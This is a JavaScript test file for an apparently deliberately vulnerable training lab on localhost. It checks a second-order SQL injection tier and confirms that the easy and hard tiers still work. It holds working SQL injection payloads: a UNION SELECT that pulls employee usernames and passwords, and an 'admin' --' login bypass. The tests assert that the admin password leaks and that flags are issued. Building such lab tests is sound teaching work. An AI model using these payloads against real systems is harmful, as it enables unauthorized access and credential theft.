/**
 * tests/sql-injection-expert-tier.test.js — Phase 7 addition: genuine
 * Expert-tier content for sql-injection (upgrade-spec Section 15's fourth
 * tier, Section 17's named "second-order" SQLi variant). Third lab with
 * real Expert content, after ssrf and jwt-vulnerabilities.
 *
 * The technique: storage is genuinely safe (a real parameterized INSERT —
 * verified directly by confirming injection syntax stored via it produces
 * no error and doesn't leak anything on its own), but a separate, later
 * feature re-embeds that already-stored value into a brand-new raw SQL
 * string. The vulnerability only fires on the SECOND use, not the first.
 */
const http = require("http");

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 30000).unref();

function req(method, urlPath, { cookies, body } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = {};
    if (cookies) headers.Cookie = cookies;
    if (data) { headers["Content-Type"] = "application/json"; headers["Content-Length"] = Buffer.byteLength(data); }
    const r = http.request({ host: "localhost", port: 3000, path: urlPath, method, headers }, (res) => {
      let out = "";
      res.on("data", (d) => (out += d));
      res.on("end", () => resolve({ status: res.statusCode, body: out, json: () => JSON.parse(out), setCookies: res.headers["set-cookie"] || [] }));
    });
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
function extractCookie(setCookies, name) {
  const line = setCookies.find((c) => c.startsWith(name + "="));
  return line ? line.split(";")[0] : null;
}

const UNION_PAYLOAD = "x' UNION SELECT username, password FROM employees --";

async function run() {
  const rInit = await req("GET", "/vuln/sql-injection?difficulty=expert");
  check("the guard lets expert through for sql-injection (3rd lab enabled)", rInit.status === 200);
  const cookies = extractCookie(rInit.setCookies, "sid");

  // --- storage is genuinely safe: injection syntax stores without error ---
  const rStore = await req("POST", "/vuln/sql-injection/submit-note", { cookies, body: { username: "alice-test", note: UNION_PAYLOAD } });
  check("storing injection syntax succeeds (no SQL error)", rStore.status === 200 && rStore.json().success === true);
  check("the note is stored exactly as given (proves it's genuinely just stored as literal text, not executed)", rStore.json().stored.note === UNION_PAYLOAD);

  // --- the vulnerability only fires on the SECOND use ---------------------
  const rAudit = await req("GET", `/vuln/sql-injection/audit-log?difficulty=expert&username=alice-test`, { cookies });
  check("audit-log responds 200", rAudit.status === 200);
  check("the second-order injection leaks the admin password", /Adm1n_Sup3rSecret!/.test(rAudit.body), rAudit.body.slice(0, 300));
  const flagMatch = rAudit.body.match(/FLAG\{sql-injection-expert-[a-f0-9]+\}/);
  check("a real, correctly-tiered flag is issued", !!flagMatch);

  // --- a benign note leaks nothing (confirms this isn't just always-on) ---
  const cookies2 = extractCookie((await req("GET", "/vuln/sql-injection?difficulty=expert")).setCookies, "sid");
  await req("POST", "/vuln/sql-injection/submit-note", { cookies: cookies2, body: { username: "bob-test", note: "Reminder: standup at 10am" } });
  const rAuditBenign = await req("GET", `/vuln/sql-injection/audit-log?difficulty=expert&username=bob-test`, { cookies: cookies2 });
  check("a benign note through the same path leaks nothing", !/Adm1n_Sup3rSecret!/.test(rAuditBenign.body));
  check("a benign note yields no flag", !/FLAG\{/.test(rAuditBenign.body));

  // --- a username with no notes at all doesn't crash ---------------------
  const rAuditEmpty = await req("GET", `/vuln/sql-injection/audit-log?difficulty=expert&username=nobody-has-this-name`, { cookies });
  check("a username with no stored notes responds cleanly, not a 500", rAuditEmpty.status === 200);
  check("...and shows no note on file", /\(none\)/.test(rAuditEmpty.body));

  // --- confirm the other 3 tiers are completely unchanged -----------------
  const rEasy = await req("GET", `/vuln/sql-injection?difficulty=easy&username=${encodeURIComponent("admin' --")}&password=x`);
  check("easy tier: classic login bypass still works exactly as before", /FLAG\{sql-injection-easy-/.test(rEasy.body));

  const rHard = await req("GET", `/vuln/sql-injection?difficulty=hard&dept=${encodeURIComponent("zzz' UNION SELECT username,password FROM employees --")}`);
  check("hard tier: UNION-via-search-field still works exactly as before", /FLAG\{sql-injection-hard-/.test(rHard.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}

run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
